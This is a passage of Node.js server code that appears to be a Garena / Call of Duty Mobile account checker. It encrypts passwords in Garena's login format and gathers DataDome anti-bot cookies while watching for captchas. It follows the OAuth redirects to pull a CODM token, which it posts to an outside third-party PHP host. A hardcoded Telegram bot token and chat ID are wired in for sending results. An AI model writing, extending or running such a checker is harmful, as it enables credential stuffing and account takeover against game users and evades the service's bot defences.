
// server.js
const os = require('os');
const sys = { // Partial sys emulation
    exit: (code) => {
        const message = `sys.exit(${code}) called. This indicates a critical issue that would halt a CLI. In API, throwing error.`;
        console.warn(message);
        // Throw a specific error type that can be caught by a global Express error handler
        const err = new Error(`EXIT_REQUESTED_CODE_${code}`);
        err.isSysExit = true;
        err.exitCode = code;
        throw err;
    },
    stdin: process.stdin, // Not used in API
    stdout: process.stdout, // For console logging
    stderr: process.stderr, // For console error logging
    version: process.version,
};
const re = { // RegExp helper
    compile: (pattern, flags) => new RegExp(pattern, flags),
    search: (pattern, text) => {
        if (typeof text !== 'string') return null;
        const regex = (typeof pattern === 'string') ? new RegExp(pattern) : pattern;
        return regex.exec(text);
    },
    match: (pattern, text) => {
        if (typeof text !== 'string') return null;
        const regex = (typeof pattern === 'string') ? new RegExp(pattern) : pattern;
        return regex.exec(text);
    },
    sub: (pattern, repl, text) => {
        if (typeof text !== 'string') return String(text);
        const regex = (typeof pattern === 'string') ? new RegExp(pattern, 'g') : pattern; // Assuming global replace
        return text.replace(regex, repl);
    },
    escape: (str) => {
        if (typeof str !== 'string') return '';
        return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'); // Basic regex escape
    }
};
const time = {
    time: () => Math.floor(Date.now() / 1000),
    sleep: (seconds) => new Promise(resolve => setTimeout(resolve, seconds * 1000)),
};
const json = JSON; // Direct mapping
const hashlib = require('crypto-js'); // Using crypto-js for MD5, SHA256
const random = {
    randint: (a, b) => Math.floor(Math.random() * (b - a + 1)) + a,
    choice: (arr) => {
        if (!arr || arr.length === 0) return undefined;
        return arr[Math.floor(Math.random() * arr.length)];
    },
    shuffle: (array) => { // Fisher-Yates shuffle
        if (!Array.isArray(array)) return;
        for (let i = array.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [array[i], array[j]] = [array[j], array[i]];
        }
    }
};

// Logging - basic console logging
const logging = {
    DEBUG: 10, INFO: 20, WARNING: 30, ERROR: 40, CRITICAL: 50,
    _level: 20, // Default to INFO
    _log_file_path: null,
    _fs: require('fs'),
    _path: require('path'),

    basicConfig: ({ level, handlers }) => {
        if (level !== undefined) logging._level = level;
        if (handlers && Array.isArray(handlers)) {
            for (const handler of handlers) {
                if (handler instanceof FileHandler && handler.filename) {
                    logging._log_file_path = handler.filename;
                    try {
                        const logDir = logging._path.dirname(logging._log_file_path);
                        if (!logging._fs.existsSync(logDir)) {
                            logging._fs.mkdirSync(logDir, { recursive: true });
                        }
                    } catch (e) { console.error("Error creating log directory:", e.message); }
                }
            }
        }
    },
    _log: (level, levelName, args) => {
        if (level >= logging._level) {
            const messageContent = args.map(arg => {
                if (arg instanceof Error) return arg.stack || arg.message;
                if (typeof arg === 'object' && arg !== null) {
                    try { return json.stringify(arg, null, 2); }
                    catch (e) { return '[Unserializable Object]'; }
                }
                return String(arg);
            }).join(' ');

            const timestamp = new Date().toISOString();
            const logMessage = `${timestamp} - ${levelName} - ${messageContent}`;

            if (level >= logging.ERROR) console.error(logMessage);
            else if (level === logging.WARNING) console.warn(logMessage);
            else console.log(logMessage);

            if (logging._log_file_path) {
                try {
                    logging._fs.appendFileSync(logging._log_file_path, logMessage + '\n', 'utf-8');
                } catch (e) { console.error("Error writing to log file:", e.message); }
            }
        }
    },
    debug: (...args) => logging._log(logging.DEBUG, 'DEBUG', args),
    info: (...args) => logging._log(logging.INFO, 'INFO', args),
    warning: (...args) => logging._log(logging.WARNING, 'WARNING', args),
    error: (...args) => logging._log(logging.ERROR, 'ERROR', args),
    critical: (...args) => logging._log(logging.CRITICAL, 'CRITICAL', args),
    exception: (...args) => {
        let msgParts = [];
        let errStack = '';
        for (const arg of args) {
            if (arg instanceof Error) errStack = arg.stack || String(arg);
            else msgParts.push((typeof arg === 'object' && arg !== null) ? json.stringify(arg, null, 2) : String(arg));
        }
        const message = msgParts.join(' ');
        const finalLogMessage = message && errStack ? `${message}\n${errStack}` : (errStack || message || "Exception logged.");
        logging._log(logging.ERROR, 'ERROR', [finalLogMessage]);
    },
    getLevelName: (level) => {
        for (const name in logging) {
            if (logging[name] === level && typeof logging[name] === 'number') return name;
        }
        return String(level);
    },
    getLogger: () => ({ level: logging._level })
};

class FileHandler {
    constructor(filename, encoding = 'utf-8') {
        this.filename = filename;
        this.encoding = encoding;
    }
}
logging.FileHandler = FileHandler;


const urllib = {
    parse: require('url'),
    request: require('axios'), // Using axios
};
urllib.parse.quote = encodeURIComponent;
urllib.parse.unquote = decodeURIComponent;
urllib.parse.urlencode = (params) => {
    if (typeof params !== 'object' || params === null) return '';
    return new URLSearchParams(params).toString();
};
urllib.parse.urlparse = (urlString) => {
    try { return new URL(urlString); }
    catch (e) { return urllib.parse.parse(urlString); }
};
urllib.parse.parse_qs = (qs) => {
    if (typeof qs !== 'string') return {};
    return Object.fromEntries(new URLSearchParams(qs));
};

const platform = {
    system: () => os.platform(),
    release: () => os.release(),
};
const axios = require('axios');
const FormData = require('form-data'); // Still needed for Telegram if sending files, but task says remove file sending.
const fs = require('fs');
const fsExtra = require('fs-extra');
const path = require('path');
const crypto = require('crypto');

const { CookieJar } = require('tough-cookie');
const { wrapper: axiosCookieJarSupport } = require('axios-cookiejar-support');
axiosCookieJarSupport(axios);

const Fore = {
    RED: '\x1b[31m', GREEN: '\x1b[32m', YELLOW: '\x1b[33m', BLUE: '\x1b[34m',
    MAGENTA: '\x1b[35m', CYAN: '\x1b[36m', WHITE: '\x1b[37m', LIGHTBLACK_EX: '\x1b[90m',
};
const Style = { BRIGHT: '\x1b[1m', RESET_ALL: '\x1b[0m', DIM: '\x1b[2m', };
const Back = { RED: '\x1b[41m', };
const init = ({ autoreset }) => { /* no-op */ };
init({ autoreset: true });

const COLORS = {
    "RED": Fore.RED, "GREEN": Fore.GREEN, "YELLOW": Fore.YELLOW, "BLUE": Fore.BLUE,
    "MAGENTA": Fore.MAGENTA, "CYAN": Fore.CYAN, "WHITE": Fore.WHITE, "GREY": Fore.LIGHTBLACK_EX,
    "BOLD": Style.BRIGHT, "RESET": Style.RESET_ALL, "HIGHLIGHT": "\x1b[7m",
    "RED_BG": Style.BRIGHT + Fore.WHITE + Back.RED,
    "BLUE_BOLD": Fore.BLUE + Style.BRIGHT,
};


const { DateTime, Settings } = require('luxon');
Settings.defaultZone = 'utc';

try {
    if (!crypto || typeof crypto.createCipheriv !== 'function') {
      throw new Error("Node.js crypto module is not available or incomplete.");
    }
} catch (e) {
    console.error(`${COLORS.RED_BG}ERROR: CRYPTO MODULE NOT FOUND. ${e.message}${COLORS.RESET}`);
    sys.exit(1);
}

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "7671609285:AAFYtH0qVuRWWoJTI8gcCriFEAVu11eMayo";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "6542321044";

const DATADOME_JSON_FILE = path.resolve(__dirname, ".datadome.json");
const MAX_DATADOMES_IN_JSON = 20;

const NEW_COOKIES_JSON_FILE = path.resolve(__dirname, ".newCookies.json");
const MAX_COOKIE_SETS_IN_JSON = 20;

const MAX_DATADOME_RETRIES_FOR_ACCOUNT = 3; // This constant might still be relevant for non-proxy retries.
const REQUEST_TIMEOUT = 30; // seconds

// Removed RETRYABLE_PROXY_ERROR_PREFIXES as proxy functionality is removed.
const GARENA_COUNTRY_MAP = {
    "ID": "INDONESIA", "SG": "SINGAPORE", "MY": "MALAYSIA",
    "PH": "PHILIPPINES", "TH": "THAILAND", "VN": "VIETNAM",
    "TW": "TAIWAN", "INDIA": "INDIA", "IND": "INDIA",
    "INDONESIA": "INDONESIA", "SINGAPORE": "SINGAPORE", "MALAYSIA": "MALAYSIA",
    "PHILIPPINES": "PHILIPPINES", "THAILAND": "THAILAND", "VIETNAM": "VIETNAM",
    "TAIWAN": "TAIWAN",
    "US": "UNITED STATES", "UNITED STATES": "UNITED STATES",
    "BR": "BRAZIL", "BRAZIL": "BRAZIL",
};

const APK_URL = "https://auth.garena.com/api/login";
const REDIRECT_URL = "https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/";

class _HardcodedCookies {
    static get_cookies() {
        return {
            "_ga_57E30E1PMN": "GS1.2.1729857978.1.0.1729857978.0.0.0",
            "_ga": "GA1.1.807684783.1745020674",
        };
    }
}

function load_json_from_file(filePath, logName = "data") {
    if (!fs.existsSync(filePath)) return [];
    try {
        const fileContent = fs.readFileSync(filePath, 'utf-8');
        if (!fileContent.trim()) return [];
        return json.parse(fileContent);
    } catch (e) {
        logging.error(`Error loading ${logName} from ${filePath}: ${e.message}`);
        return [];
    }
}

function save_json_to_file(filePath, data, logName = "data") {
    try {
        fs.writeFileSync(filePath, json.stringify(data, null, 2), 'utf-8');
        logging.info(`Saved/Updated ${logName} to ${filePath}`);
    } catch (e) {
        logging.error(`Error writing ${logName} to ${filePath}: ${e.message}`);
    }
}

function load_cookie_sets_from_storage() {
    const data = load_json_from_file(NEW_COOKIES_JSON_FILE, "cookie sets");
    if (Array.isArray(data)) {
        return data.filter(item => typeof item === 'object' && item !== null && Object.keys(item).length > 0);
    }
    logging.warning(`${NEW_COOKIES_JSON_FILE} does not contain a list of cookie sets.`);
    return [];
}

function save_cookie_set_to_storage(new_cookie_set) {
    if (typeof new_cookie_set !== 'object' || new_cookie_set === null || Object.keys(new_cookie_set).length === 0) {
        logging.debug("Attempted to save an empty or invalid cookie set. Skipping.");
        return;
    }
    let cookie_sets = load_cookie_sets_from_storage();
    const newCookieSetString = JSON.stringify(new_cookie_set);
    if (!cookie_sets.some(cs => JSON.stringify(cs) === newCookieSetString)) {
        cookie_sets.push(new_cookie_set);
        while (cookie_sets.length > MAX_COOKIE_SETS_IN_JSON) {
            cookie_sets.shift(); // Remove oldest
        }
        save_json_to_file(NEW_COOKIES_JSON_FILE, cookie_sets, "cookie sets");
    }
}

function starting_cookies() {
    let cookies_to_use = null;
    let source_message = "";

    const given_cookies = _HardcodedCookies.get_cookies();
    if (typeof given_cookies === 'object' && given_cookies !== null && Object.keys(given_cookies).length > 0) {
        save_cookie_set_to_storage(given_cookies);
    } else {
        logging.warning("Hardcoded cookies from _HardcodedCookies are invalid or empty.");
    }

    try {
        const changeCookiePath = path.join(__dirname, 'change_cookie.js');
        if (fs.existsSync(changeCookiePath)) {
            const change_cookie = require(changeCookiePath);
            if (change_cookie && typeof change_cookie.get_cookies === 'function') {
                const session_cookies = change_cookie.get_cookies();
                if (typeof session_cookies === 'object' && session_cookies !== null && Object.keys(session_cookies).length > 0) {
                    cookies_to_use = session_cookies;
                    source_message = "Using cookies from 'change_cookie.js'.";
                    logging.info(source_message);
                    save_cookie_set_to_storage(cookies_to_use);
                } else {
                    logging.warning("'change_cookie.get_cookies()' returned invalid data.");
                }
            } else {
                logging.warning("'change_cookie.js' found, but 'get_cookies' is missing.");
            }
        } else {
             logging.info("Optional 'change_cookie.js' not found.");
        }
    } catch (e) {
        if (e.code === 'MODULE_NOT_FOUND' && e.message.includes('change_cookie.js')) {
            logging.info("Optional 'change_cookie.js' not found.");
        } else {
            logging.error(`Error with 'change_cookie.js': ${e.message}.`);
        }
    }

    if (!cookies_to_use) {
        const stored_cookie_sets = load_cookie_sets_from_storage();
        if (stored_cookie_sets.length > 0) {
            cookies_to_use = random.choice(stored_cookie_sets);
            if (cookies_to_use) {
                source_message = `Using random stored cookie set from '${path.basename(NEW_COOKIES_JSON_FILE)}'.`;
                logging.info(source_message);
            } else {
                logging.warning(`Could not select a cookie from '${path.basename(NEW_COOKIES_JSON_FILE)}'.`);
            }
        } else {
            logging.info(`No valid cookie sets in '${path.basename(NEW_COOKIES_JSON_FILE)}'.`);
        }
    }

    if (!cookies_to_use) {
        if (typeof given_cookies === 'object' && given_cookies !== null && Object.keys(given_cookies).length > 0) {
            cookies_to_use = given_cookies;
            source_message = "Using 'given' (hardcoded) cookies as fallback.";
            logging.info(source_message);
        } else {
            logging.error("All cookie sources failed. Using empty cookies.");
            cookies_to_use = {};
            source_message = "All cookie sources failed. Using empty cookies.";
        }
    }
    
    if (typeof cookies_to_use !== 'object' || cookies_to_use === null) { 
        logging.critical(`Cookies became non-object. Using empty object.`);
        cookies_to_use = {};
        source_message += " (CRITICAL_FALLBACK: reset to empty)";
    }

    logging.info(`Final cookie source: ${source_message || "No specific source, check logs."}`);
    return [cookies_to_use, source_message];
}

function strip_ansi_codes(text) {
    if (typeof text !== 'string') return String(text);
    const ansi_escape = /\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])/g;
    return text.replace(ansi_escape, '');
}

function get_current_timestamp() {
    return String(Math.floor(Date.now() / 1000));
}

function generate_md5_hash(password) {
    if (typeof password !== 'string') password = String(password);
    return hashlib.MD5(password).toString(hashlib.enc.Hex);
}

function generate_decryption_key(password_md5, v1, v2) {
    const intermediate_hash = hashlib.SHA256(String(password_md5) + String(v1)).toString(hashlib.enc.Hex);
    return hashlib.SHA256(intermediate_hash + String(v2)).toString(hashlib.enc.Hex);
}

function encrypt_aes_256_ecb(plaintext_hex, key_hex) {
    // IMPORTANT: This truncates ciphertext to 16 bytes.
    try {
        const keyBuffer = Buffer.from(key_hex, 'hex');
        if (keyBuffer.length !== 32) { // 256 bits = 32 bytes
            throw new Error(`AES key must be 32 bytes, got ${keyBuffer.length}.`);
        }
        const plaintextBuffer = Buffer.from(plaintext_hex, 'hex');
        const blockSize = 16;
        const paddingLength = blockSize - (plaintextBuffer.length % blockSize || blockSize);
        const paddingBuffer = Buffer.alloc(paddingLength, paddingLength);
        const paddedPlaintext = Buffer.concat([plaintextBuffer, paddingBuffer]);
        const cipher = crypto.createCipheriv('aes-256-ecb', keyBuffer, null);
        cipher.setAutoPadding(false);
        let encrypted = cipher.update(paddedPlaintext, null, 'hex');
        encrypted += cipher.final('hex');
        return encrypted.substring(0, 32); // Truncate
    } catch (e) {
         const safePlaintext = typeof plaintext_hex === 'string' ? plaintext_hex.substring(0,10) : 'N/A';
         const safeKey = typeof key_hex === 'string' ? key_hex.substring(0,10) : 'N/A';
         logging.error(`AES ENCRYPTION ERROR: ${e.message}. PLAINTEXT_HEX: ${safePlaintext}..., KEY_HEX: ${safeKey}...`);
         throw e;
    }
}

function get_encrypted_password(password, v1, v2) {
    const password_md5 = generate_md5_hash(password);
    const decryption_key_hex = generate_decryption_key(password_md5, v1, v2);
    return encrypt_aes_256_ecb(password_md5, decryption_key_hex);
}

function get_request_data(initial_cookies_tuple) {
    let [cookies] = initial_cookies_tuple;
    if (typeof cookies !== 'object' || cookies === null) {
        logging.warning("get_request_data received non-object cookies. Using empty object.");
        cookies = {};
    }
    const user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36';
    const headers = {
        'Host': 'auth.garena.com', 'Connection': 'keep-alive',
        'sec-ch-ua': '"Google Chrome";v="129", "Not)A;Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0', 'User-Agent': user_agent, 'sec-ch-ua-platform': '"Windows"',
        'Accept': 'application/json, text/plain, */*', 'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=' + urllib.parse.quote(REDIRECT_URL),
        'Accept-Encoding': 'gzip, deflate, br, zstd', 'Accept-Language': 'en-US,en;q=0.9'
    };
    return [cookies, headers];
}

function detect_captcha_in_response(response_text) {
    return typeof response_text === 'string' && response_text.toLowerCase().includes("captcha");
}

async function get_public_ip(timeout = REQUEST_TIMEOUT) { // Removed proxies param
    const axiosConfig = { timeout: timeout * 1000 };
    // Removed proxy config
    try {
        const response = await axios.get('https://api.ipify.org?format=json', axiosConfig);
        if (response.status !== 200 || !response.data || typeof response.data.ip !== 'string') {
            throw new Error(`HTTP error ${response.status} or invalid IP data`);
        }
        return response.data.ip;
    } catch (e) {
        logging.warning(`COULD NOT FETCH PUBLIC IP: ${e.message}`);
        return `IP FETCH ERROR (${e.constructor.name})`;
    }
}

function load_datadomes_from_storage() {
    const data = load_json_from_file(DATADOME_JSON_FILE, "datadomes");
    if (Array.isArray(data)) {
        return data.filter(item => typeof item === 'string' && item.trim().length > 0);
    }
    logging.warning(`${path.basename(DATADOME_JSON_FILE)} does not contain a list of datadomes.`);
    return [];
}

function save_datadome_to_storage(new_datadome) {
    if (typeof new_datadome !== 'string' || !new_datadome.trim()) {
        logging.debug("Attempted to save an empty or invalid datadome. Skipping.");
        return;
    }
    if (new_datadome.startsWith("[🤖]") || new_datadome.startsWith("[⚠️]")) {
        logging.warning(`Attempted to save an error/captcha string as a datadome: ${new_datadome.substring(0, 50)}`);
        return;
    }
    let datadomes = load_datadomes_from_storage();
    if (!datadomes.includes(new_datadome)) {
        datadomes.push(new_datadome);
        while (datadomes.length > MAX_DATADOMES_IN_JSON) {
            datadomes.shift(); // Remove oldest
        }
        save_json_to_file(DATADOME_JSON_FILE, datadomes, "datadomes");
    }
}

async function send_telegram_message(message_text, bot_token, chat_id) {
    if (!bot_token || !chat_id || bot_token === "7671609285:AAFYtH0qVuRWWoJTI8gcCriFEAVu11eMayo" || chat_id === "6542321044") {
        logging.warning("TELEGRAM BOT TOKEN OR CHAT ID IS NOT CONFIGURED OR USING PLACEHOLDERS. SKIPPING MESSAGE SENDING.");
        return { success: false, error: "Telegram not configured." };
    }
    if (typeof message_text !== 'string' || !message_text.trim()) {
        logging.warning("Cannot send empty message to Telegram.");
        return { success: false, error: "Empty message." };
    }

    logging.info(`Attempting to send message to Telegram chat ID ${chat_id.substring(0,4)}...`);
    const api_url = `https://api.telegram.org/bot${bot_token}/sendMessage`;
    
    try {
        const response = await axios.post(api_url, {
            chat_id: chat_id,
            text: message_text,
            // parse_mode: "HTML" // Optional: or "MarkdownV2"
        }, {
            timeout: 15000 // 15 seconds timeout for sending a message
        });
        
        if (response.data && response.data.ok) {
            logging.info(`Successfully sent message to Telegram: "${message_text.substring(0, 70)}..."`);
            return { success: true, result: response.data.result };
        } else {
            const error_desc = response.data && response.data.description ? response.data.description : 'Unknown Telegram API error';
            logging.error(`Failed to send message to Telegram: ${error_desc}`);
            return { success: false, error: error_desc, response_data: response.data };
        }
    } catch (e) {
        let error_message = e.message;
        if (e.code === 'ETIMEDOUT' || (e.response && e.response.status === 408) ) {
             error_message = `Timeout sending message to Telegram.`;
        } else if (e.isAxiosError) {
             error_message = `Network/Request error sending message to Telegram: ${strip_ansi_codes(e.message)}`;
             if(e.response && e.response.data) logging.error(`Telegram Response: ${json.stringify(e.response.data)}`);
        } else {
             error_message = `Unexpected error sending message to Telegram: ${e.message}`;
        }
        logging.error(error_message, e);
        return { success: false, error: error_message, details: e };
    }
}


async function get_datadome_cookie(timeout = REQUEST_TIMEOUT) { // Removed proxies param
    const url = 'https://dd.garena.com/js/';
    const headers = {
        'accept': '*/*', 'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9', 'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://account.garena.com', 'pragma': 'no-cache',
        'referer': 'https://account.garena.com/',
        'sec-ch-ua': '"Google Chrome";v="129", "Not)A;Brand";v="8", "Chromium";v="129"',
        'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
    };
    const payload = {
        'jsData': json.stringify({"ttst": random.randint(50, 150), "br_oh":1080, "br_ow":1920}),
        'eventCounters': '[]', 'jsType': 'ch', 'ddv': '4.35.4',
        'Referer': 'https://account.garena.com/', 'request': '%2F', 'responsePage': 'origin',
    };
    const data = urllib.parse.urlencode(payload);

    const axiosConfig = {
        headers: headers,
        timeout: timeout * 1000,
        // Removed proxy config
    };
    
    try {
        const response = await axios.post(url, data, axiosConfig);
        
        let response_json;
        let raw_response_data_str = "";

        if (typeof response.data === 'string') {
            raw_response_data_str = strip_ansi_codes(response.data);
            try {
                response_json = json.parse(raw_response_data_str);
            } catch (e) {
                if (detect_captcha_in_response(raw_response_data_str)) {
                    logging.warning(`CAPTCHA IN DATADOME (NON-JSON STRING): ${raw_response_data_str.substring(0, 200)}`);
                    return "[🤖] CAPTCHA DETECTED (DATADOME RESPONSE BODY)";
                }
                logging.error(`Failed to parse datadome string response: ${e.message}. Snippet: ${raw_response_data_str.substring(0, 200)}`);
                return `[⚠️] DATADOME ERROR: NON-JSON RESPONSE (${e.message.substring(0,50)})`;
            }
        } else if (typeof response.data === 'object' && response.data !== null) {
            response_json = response.data;
            try { raw_response_data_str = strip_ansi_codes(json.stringify(response_json)); }
            catch (e) { raw_response_data_str = "[Unstringifiable JSON Object]";}
        } else {
            logging.error(`Unexpected datadome response type: ${typeof response.data}. Status: ${response.status}`);
            return `[⚠️] DATADOME ERROR: UNEXPECTED RESPONSE DATA TYPE (${typeof response.data})`;
        }

        if (detect_captcha_in_response(raw_response_data_str)) {
            logging.warning(`CAPTCHA IN DATADOME RESPONSE: ${raw_response_data_str.substring(0,200)}`);
            return "[🤖] CAPTCHA DETECTED (DATADOME PARSED/STRINGIFIED)";
        }
        if (response.status < 200 || response.status >= 300) { 
             throw new Error(`HTTP error ${response.status}`);
        }

        if (response_json && response_json.cookie) {
            const cookie_string = response_json.cookie;
            const match = /datadome=([^;]+)/.exec(cookie_string);
            if (match && match[1]) {
                const datadome_value = match[1];
                save_datadome_to_storage(datadome_value);
                return datadome_value;
            }
        }
        logging.warning(`Datadome response missing cookie: ${raw_response_data_str.substring(0,300)}`);
        return null;
    } catch (e) {
        const error_str = strip_ansi_codes(e.message);
        const resp_text_snippet = strip_ansi_codes(e.response && e.response.data ? String(e.response.data).substring(0,100) : "");

        if (detect_captcha_in_response(error_str) || detect_captcha_in_response(resp_text_snippet)) {
             logging.warning(`CAPTCHA during datadome request/parse error: ${error_str} / ${resp_text_snippet}`);
             return "[🤖] CAPTCHA DETECTED (DATADOME REQUEST/PARSE ERROR)";
        }
        if (e.code === 'ECONNABORTED' || e.message.toLowerCase().includes('timeout')) { 
            logging.error(`Timeout getting datadome cookie: ${error_str}`);
            return "[⏱️] DATADOME TIMEOUT";
        }
        if (e.isAxiosError && !e.response) { 
            logging.error(`Connection error getting datadome cookie: ${error_str}`);
            return "[🔴] DATADOME CONNECTION ERROR";
        }
        logging.exception(`Failed to get datadome cookie:`, e);
        return `[⚠️] DATADOME ERROR: ${error_str.substring(0,100)}`;
    }
}

function parseSetCookies(setCookieHeader) {
    if (!setCookieHeader) return {};
    const cookies = {};
    try {
        const setCookieParser = require('set-cookie-parser');
        const parsed = setCookieParser.parse(setCookieHeader, { map: true });
        for (const name in parsed) {
            cookies[name] = parsed[name].value;
        }
    } catch (e) {
        logging.error(`Error parsing Set-Cookie: ${e.message}. Header: ${String(setCookieHeader).substring(0,100)}`);
    }
    return cookies;
}

function parseAxiosResponseData(responseData, context = "Response") {
    if (typeof responseData === 'object' && responseData !== null) {
        return { data: responseData, error: null, raw: null };
    }
    if (typeof responseData === 'string') {
        const cleanData = strip_ansi_codes(responseData);
        try {
            return { data: json.parse(cleanData), error: null, raw: cleanData };
        } catch (e) {
            return { data: null, error: e, raw: cleanData };
        }
    }
    const err = new Error(`Unexpected ${context} data type: ${typeof responseData}`);
    return { data: null, error: err, raw: String(responseData) };
}


async function show_level(access_token, selected_header, cookies_for_codm, timeout = REQUEST_TIMEOUT) { // Removed proxies param
    const callback_base_url = "https://auth.codm.garena.com/auth/auth/callback_n";
    const callback_params = {"site": "https://api-delete-request.codm.garena.co.id/oauth/callback/", "access_token": access_token};
    let headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9",
        "Referer": "https://auth.garena.com/", "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-site",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": (selected_header && selected_header["User-Agent"]) || "Mozilla/5.0",
    };
    if (selected_header) {
        for (const key in selected_header) {
            if (key.toLowerCase().startsWith('sec-ch-ua')) headers[key] = selected_header[key];
        }
    }

    let current_cookies = { ...(cookies_for_codm || {}) };
    let extracted_token = null;

    try {
        let current_url = callback_base_url;
        let current_params_obj = { ...callback_params };
        let redirect_count = 0;
        const max_redirects = 7;

        while (redirect_count < max_redirects) {
            const cookieString = Object.entries(current_cookies).map(([k, v]) => `${k}=${v}`).join('; ');
            const axiosConfig = {
                headers: {...headers, 'Cookie': cookieString },
                params: current_params_obj,
                maxRedirects: 0,
                // Removed proxy config
                timeout: timeout * 1000,
                validateStatus: (status) => status >= 200 && status < 400 || [301, 302, 303, 307, 308].includes(status),
            };

            const response = await axios.get(current_url, axiosConfig);
            const { raw: response_text_clean } = parseAxiosResponseData(response.data, "CODM callback");
            const newCookiesFromResponse = parseSetCookies(response.headers['set-cookie']);
            current_cookies = { ...current_cookies, ...newCookiesFromResponse };

            if (detect_captcha_in_response(response_text_clean)) {
                logging.warning(`CAPTCHA IN CODM callback (URL: ${current_url.substring(0,100)}...)`);
                return "[🤖] CAPTCHA DETECTED (CODM CALLBACK/REDIRECT BODY)";
            }

            if ([301, 302, 303, 307, 308].includes(response.status)) {
                const redirect_url_header = response.headers['location'] || response.headers['Location'];
                if (!redirect_url_header) {
                    logging.error("CODM REDIRECT but no Location header.");
                    return "[CODM FAIL] REDIRECT NO LOCATION HEADER";
                }
                const parsedCurrentUrl = new URL(current_url);
                current_url = new URL(redirect_url_header, parsedCurrentUrl.origin + parsedCurrentUrl.pathname).toString();
                current_params_obj = null;
                redirect_count += 1;
                logging.debug(`CODM Redirect #${redirect_count}: to ${current_url.substring(0,100)}...`);
                await time.sleep(0.2);
            } else if (response.status >= 200 && response.status < 300) {
                const final_url = response.request.res.responseUrl || current_url;
                const parsed_final_url = new URL(final_url);
                const query_params = Object.fromEntries(parsed_final_url.searchParams);
                extracted_token = query_params.token || null;

                if (!extracted_token && response_text_clean) {
                     const match = /["']token["']\s*:\s*["']([\w\-.]+)["']/.exec(response_text_clean);
                     if (match && match[1]) extracted_token = match[1];
                }
                if (!extracted_token) {
                     logging.warning(`CODM TOKEN EXTRACTION FAILED. Final URL: ${final_url}, Status: ${response.status}, Body: ${String(response_text_clean).substring(0,200)}`);
                     return "[CODM FAIL] COULD NOT EXTRACT CODM TOKEN";
                }
                break;
            } else {
                throw new Error(`Unexpected status ${response.status} in CODM callback`);
            }
        }

        if (redirect_count >= max_redirects) {
            logging.error("MAX REDIRECTS in CODM callback.");
            return "[CODM FAIL] MAXIMUM REDIRECTS REACHED";
        }
        
        if (!extracted_token) {
            logging.error("CODM TOKEN NULL post-redirects.");
            return "[CODM FAIL] TOKEN NULL POST-REDIRECTS";
        }

        const external_codm_script = "https://suneoxjarell.x10.bz/jajac.php";
        const payload_for_script = { "user_agent": headers["User-Agent"], "extracted_token": extracted_token };
        const script_headers = {"Content-Type": "application/json", "User-Agent": headers["User-Agent"]};

        try {
            const response_codm = await axios.post(external_codm_script, payload_for_script, {
                headers: script_headers,
                // Removed proxy config
                timeout: timeout * 1000
            });

            const { raw: script_raw_text } = parseAxiosResponseData(response_codm.data, "CODM external script");
            const response_codm_text_clean = script_raw_text ? script_raw_text.trim() : "";

            if (detect_captcha_in_response(response_codm_text_clean)) {
                 logging.warning("CAPTCHA in external CODM script response.");
                 return "[🤖] CAPTCHA DETECTED (CODM EXTERNAL SCRIPT RESPONSE)";
            }
            if (response_codm.status < 200 || response_codm.status >= 300) {
                throw new Error(`External CODM script HTTP error ${response_codm.status}. Body: ${response_codm_text_clean.substring(0,150)}`);
            }
            if (response_codm_text_clean.includes("|") && response_codm_text_clean.split("|").length === 4) {
                const parts = response_codm_text_clean.split("|");
                if (/^\d+$/.test(parts[1]) && parts.every(p => p && p.trim() !== "" && p.trim().toLowerCase() !== "n/a")) {
                     logging.info(`CODM script success: ${response_codm_text_clean}`);
                     return response_codm_text_clean;
                } else {
                     logging.warning(`CODM script invalid data: ${response_codm_text_clean}`);
                     return `[CODM WARN] SCRIPT DATA INVALID: ${response_codm_text_clean.substring(0,100)}`;
                }
            } else {
                 const lc_response = response_codm_text_clean.toLowerCase();
                 if (lc_response.includes("not found") || lc_response.includes("invalid token")) {
                     logging.warning(`CODM script: not linked/invalid token: ${response_codm_text_clean}`);
                     return `[CODM FAIL] ACCOUNT NOT LINKED/TOKEN INVALID`;
                 } else if (lc_response.includes("error") || lc_response.includes("fail")) {
                      logging.warning(`CODM script returned error: ${response_codm_text_clean}`);
                      return `[CODM FAIL] SCRIPT ERROR: ${response_codm_text_clean.substring(0,150)}`;
                 } else {
                      logging.warning(`CODM script unexpected format: ${response_codm_text_clean}`);
                      return `[CODM WARN] SCRIPT UNEXPECTED FORMAT: ${response_codm_text_clean.substring(0,100)}`;
                 }
            }
        } catch (e) {
             const err_str = strip_ansi_codes(e.message);
             const resp_text = strip_ansi_codes(e.response && e.response.data ? String(e.response.data) : "");
             if (detect_captcha_in_response(err_str) || detect_captcha_in_response(resp_text)) {
                 logging.warning(`CAPTCHA during external CODM script request error: ${err_str}`);
                 return "[🤖] CAPTCHA DETECTED (CODM EXTERNAL SCRIPT REQUEST ERROR)";
             }
